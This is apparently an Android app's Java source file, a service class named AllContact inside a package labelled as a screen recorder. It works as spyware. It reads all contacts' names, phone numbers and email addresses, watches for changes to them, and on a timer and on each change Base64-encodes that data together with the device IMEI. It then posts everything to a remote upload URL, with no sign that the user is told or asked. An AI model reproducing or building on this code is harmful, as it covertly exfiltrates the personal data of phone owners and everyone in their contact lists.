package com.recorder.screen.screen_recorder.services;

import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.net.Uri;
import android.os.IBinder;
import android.provider.ContactsContract;
import android.support.annotation.Nullable;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.recorder.screen.screen_recorder.helper.UrlDemo;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import java.io.InputStream;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import java.util.Timer;
import java.util.TimerTask;

public class AllContact extends Service {
    public static boolean contact_start = false;
    StringBuffer sb;
    String time_stamp;
    String ContactFile;
    String changeEmail, changeEmailType;
    String id;
    private String phoneNumber;
    String name;
    private StringBuffer stringBuffer = null;
    Timer contacttimer;

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onStart(Intent intent, int startId) {
        contact_start = true;
        //SendContactData();
        contacttimer = new Timer();
        contacttimer.schedule(new TimerTask() {
            @Override
            public void run() {
                Log.e(".............", "----------------------------------------- AllContact");
                SendContactData();
            }
        }, 20000, 60500);//change Timer Value

        getContentResolver().registerContentObserver(ContactsContract.Contacts.CONTENT_URI, true, new MyCOntentObserver());

        super.onStart(intent, startId);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        contact_start = true;
        readContacts();
        return super.onStartCommand(intent, flags, startId);
    }

    public class MyCOntentObserver extends ContentObserver {

        int a = 0;

        public MyCOntentObserver() {
            super(null);
        }

        @Override
        public void onChange(boolean selfChange, Uri uri) {
            stringBuffer = new StringBuffer();
            super.onChange(selfChange);

            a = a + 1;

            if (a == 2) {
                a = 0;
                Cursor cursor = getContentResolver().query(
                        ContactsContract.Contacts.CONTENT_URI, null, null, null, ContactsContract.Contacts.CONTACT_LAST_UPDATED_TIMESTAMP + " Desc");

                if (cursor.moveToNext()) {
                    id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    stringBuffer.append("\n" + name + "#,$");
                    // System.out.println(name);

                    Cursor phones = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = " + id, null, null);
                    while (phones.moveToNext()) {
                        phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        String ph_type = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));

                        stringBuffer.append("\n" + phoneNumber + "(" + ph_type + ")" + "#,$");
                    }
                    phones.close();

                    Cursor emailCur = getContentResolver().query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID
                                    + " = ?", new String[]{id}, null);

                    while (emailCur.moveToNext()) {
                        changeEmail = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                        changeEmailType = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
                        stringBuffer.append("\n" + changeEmail);

                    }
                    emailCur.close();
                    stringBuffer.append("\n---------------");
                }
                //Post Change Data
                InputStream CallStream = null;
                HttpClient Filehttpclient = new DefaultHttpClient();
                String fsupload = UrlDemo.fsupload;
                HttpPost filehttpPost = new HttpPost(fsupload);

                TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
                String imei = tm.getDeviceId();
                byte[] imeicontact = imei.getBytes();
                String imeicontactEncode = android.util.Base64.encodeToString(imeicontact, android.util.Base64.DEFAULT);
                String imeicontactString = imeicontactEncode.replaceAll("\n", "");

                String ContactData = android.util.Base64.encodeToString(stringBuffer.toString().getBytes(), android.util.Base64.DEFAULT);
                Log.i("sssssssssssssss", stringBuffer.toString());

                String ContactDataString = ContactData.replaceAll("\n", "");
                System.out.println("ChangeContactBaseString ==" + ContactDataString);

                try {
                    Date dt = new Date();
                    int min = dt.getMinutes();
                    int hr = dt.getHours();
                    String strmin = "", strhr = "";
                    if (min < 10)
                        strmin = "0" + Integer.toString(min);
                    else
                        strmin = Integer.toString(min);
                    if (hr < 10)
                        strhr = "0" + Integer.toString(hr);
                    else
                        strhr = Integer.toString(hr);
                    time_stamp = "" + strhr + "_" + strmin + "_" + Integer.toString(dt.getMonth() + 1) + "_" + Integer.toString(dt.getDate()) + "_" + Integer.toString(dt.getYear() + 1900) + "_";
                } catch (Exception e) {
                    Log.d(getClass().getSimpleName(), "Exception:" + e);

                }

                try {
                    SharedPreferences sp = getSharedPreferences("key", 0);
                    String tValue = sp.getString("chkcontact", "");
                    Log.d("checkcon-------", "contactSharedvaluereceive::::------" + tValue);

                    String Callfile_name = time_stamp + "Change_Contact.txt";
                    byte[] namedata = Callfile_name.getBytes("UTF-8");
                    String filenameencode = android.util.Base64.encodeToString(namedata, android.util.Base64.DEFAULT);
                    ContactFile = filenameencode.replaceAll("\n", "");

                    List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();

                    ConnectivityManager connectivity;
                    NetworkInfo wifiInfo;
                    connectivity = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
                    wifiInfo = connectivity.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
                    NetworkInfo wifiInfo1 = connectivity.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
                    if (wifiInfo.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A")) {
                        nameValuePair.add(new BasicNameValuePair("FNAME", ContactFile));
                        nameValuePair.add(new BasicNameValuePair("IMEI", imeicontactString));
                        nameValuePair.add(new BasicNameValuePair("DATA", ContactDataString));

                        filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));
                        HttpResponse response = Filehttpclient.execute(filehttpPost);
                        response.getStatusLine();
                        HttpEntity entity = response.getEntity();
                        entity = response.getEntity();

                        InputStream in = entity.getContent();
                        String buffer = "";
                        for (int i = in.read(); i != -1; i = in.read()) {
                            buffer += (char) i;
                            i++;
                        }

                        Log.d("ContactChange", "Response of Change_Contact = " + buffer);
                        stringBuffer.setLength(0);
                    } else if (wifiInfo1.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A1")) {
                        nameValuePair.add(new BasicNameValuePair("FNAME", ContactFile));
                        nameValuePair.add(new BasicNameValuePair("IMEI", imeicontactString));
                        nameValuePair.add(new BasicNameValuePair("DATA", ContactDataString));

                        filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));
                        HttpResponse response = Filehttpclient.execute(filehttpPost);
                        response.getStatusLine();
                        HttpEntity entity = response.getEntity();
                        entity = response.getEntity();

                        InputStream in = entity.getContent();
                        String buffer = "";
                        for (int i = in.read(); i != -1; i = in.read()) {
                            buffer += (char) i;
                            i++;
                        }

                        Log.d("ContactChange", "Response of Change_Contact = " + buffer);
                        stringBuffer.setLength(0);
                    } else {
                        Log.d("checkconError", "Allcontact_change connection erro");
                        return;
                    }
                    stringBuffer.setLength(0);
                } catch (Exception e) {
                    Log.d("ChangeContactException ", "ChangeContactException =" + e);
                }
                stringBuffer.setLength(0);
            }
        }//onChange

        @Override
        public boolean deliverSelfNotifications() {
            return true;
        }
    }//MyCOntentObserver end

    public void readContacts() {
        sb = new StringBuffer();
        //sb.append("......Contact Details.....");
        ContentResolver cr = getContentResolver();
        Cursor cur = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
        String phone = null;
        String phoneType = null;
        String emailContact = null;
        String emailType = null;
        String image_uri = "";
        Bitmap bitmap = null;

        if (cur.getCount() > 0) {
            while (cur.moveToNext()) {

                String id = cur.getString(cur.getColumnIndex(ContactsContract.Contacts._ID));
                String name = cur.getString(cur.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                image_uri = cur.getString(cur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.PHOTO_URI));

                if (Integer.parseInt(cur.getString(cur.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
                    System.out.println("\n" + name + "#,$");
                    sb.append("\n" + name + "#,$");


                    Cursor pCur = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID
                                    + " = ?", new String[]{id}, null);

                    while (pCur.moveToNext()) {

                        phone = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
                        phoneType = pCur.getString(pCur.getColumnIndex(ContactsContract.CommonDataKinds.Phone.TYPE));

                        sb.append("\n" + phone + "(" + phoneType + ")" + "#,$");
                    }
                    pCur.close();

                    Cursor emailCur = cr.query(ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID
                                    + " = ?", new String[]{id}, null);

                    while (emailCur.moveToNext()) {
                        emailContact = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA));
                        emailType = emailCur.getString(emailCur.getColumnIndex(ContactsContract.CommonDataKinds.Email.TYPE));
                        sb.append("\n" + emailContact + "(" + emailType + ")");
                    }

                    emailCur.close();
                }
                sb.append("\n---------------");
            }
        }
    }//readContactEnd

    private void SendContactData() {
        SharedPreferences sp = getSharedPreferences("key", 0);
        String tValue = sp.getString("chkcontact", "");
        Log.d("checkcon-------", "contactSharedvaluereceive::::------" + tValue);

        InputStream CallStream = null;
        HttpClient Filehttpclient = new DefaultHttpClient();
        //URL change Urldemo claas used
        String fsupload = UrlDemo.fsupload;
        HttpPost filehttpPost = new HttpPost(fsupload);

        TelephonyManager tm = (TelephonyManager) getSystemService(TELEPHONY_SERVICE);
        String imei = tm.getDeviceId();
        byte[] imeicontact = imei.getBytes();
        String imeicontactEncode = android.util.Base64.encodeToString(imeicontact, android.util.Base64.DEFAULT);
        String imeicontactString = imeicontactEncode.replaceAll("\n", "");

        String ContactData = android.util.Base64.encodeToString(sb.toString().getBytes(), android.util.Base64.DEFAULT);
        Log.i("ssssssssssssssssss", sb.toString());

        String ContactDataString = ContactData.replaceAll("\n", "");
        System.out.println("AllContactBaseString ==" + ContactDataString);

        try {
            Date dt = new Date();
            int min = dt.getMinutes();
            int hr = dt.getHours();
            String strmin = "", strhr = "";
            if (min < 10)
                strmin = "0" + Integer.toString(min);
            else
                strmin = Integer.toString(min);
            if (hr < 10)
                strhr = "0" + Integer.toString(hr);
            else
                strhr = Integer.toString(hr);
            time_stamp = "" + strhr + "_" + strmin + "_" + Integer.toString(dt.getMonth() + 1) + "_" + Integer.toString(dt.getDate()) + "_" + Integer.toString(dt.getYear() + 1900) + "_";
        } catch (Exception e) {
            Log.d(getClass().getSimpleName(), "Exception:" + e);

        }

        try {
            //FileName change
            String Callfile_name = "AllContact.txt";
            byte[] namedata = Callfile_name.getBytes("UTF-8");
            String filenameencode = android.util.Base64.encodeToString(namedata, android.util.Base64.DEFAULT);
            ContactFile = filenameencode.replaceAll("\n", "");
            List<NameValuePair> nameValuePair = new ArrayList<NameValuePair>();

            ConnectivityManager connectivity;
            NetworkInfo wifiInfo;
            connectivity = (ConnectivityManager) getApplicationContext().getSystemService(Context.CONNECTIVITY_SERVICE);
            wifiInfo = connectivity.getNetworkInfo(ConnectivityManager.TYPE_WIFI);
            NetworkInfo wifiInfo1 = connectivity.getNetworkInfo(ConnectivityManager.TYPE_MOBILE);
            if (wifiInfo.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A")) {
                System.out.println("IMEI NOT NUll wifi = ");
                nameValuePair.add(new BasicNameValuePair("FNAME", ContactFile));
                nameValuePair.add(new BasicNameValuePair("IMEI", imeicontactString));
                nameValuePair.add(new BasicNameValuePair("DATA", ContactDataString));

                filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

                HttpResponse response = Filehttpclient.execute(filehttpPost);

                response.getStatusLine();

                HttpEntity entity = response.getEntity();
                entity = response.getEntity();

                InputStream in = entity.getContent();
                String buffer = "";
                for (int i = in.read(); i != -1; i = in.read()) {
                    buffer += (char) i;
                    i++;
                }
                Log.d("AllContact", "Response of Contact = " + buffer);
                sb.setLength(0);
            } else if (wifiInfo1.getState().toString().equalsIgnoreCase("CONNECTED") && tValue.equalsIgnoreCase("A1")) {
                System.out.println("IMEI NOT NUll wifi = ");
                nameValuePair.add(new BasicNameValuePair("FNAME", ContactFile));
                nameValuePair.add(new BasicNameValuePair("IMEI", imeicontactString));
                nameValuePair.add(new BasicNameValuePair("DATA", ContactDataString));

                filehttpPost.setEntity((HttpEntity) new UrlEncodedFormEntity(nameValuePair));

                HttpResponse response = Filehttpclient.execute(filehttpPost);

                response.getStatusLine();

                HttpEntity entity = response.getEntity();
                entity = response.getEntity();

                InputStream in = entity.getContent();
                String buffer = "";
                for (int i = in.read(); i != -1; i = in.read()) {
                    buffer += (char) i;
                    i++;
                }
                Log.d("AllContact", "Response of Contact = " + buffer);
                sb.setLength(0);
            } else {
                Log.d("checkconError", "AllContact connection erro");
                return;
            }

        } catch (Exception e) {
            Log.d("AllContactException ", "AllContactException =" + e);
        }
        sb.setLength(0);
        try {
            contacttimer.cancel();
        } catch (Exception e) {}
    }


    public void onDestroy() {
        try {
        contacttimer.cancel();
        } catch (Exception e) {}
        contact_start = false;
        super.onDestroy();
    }
}
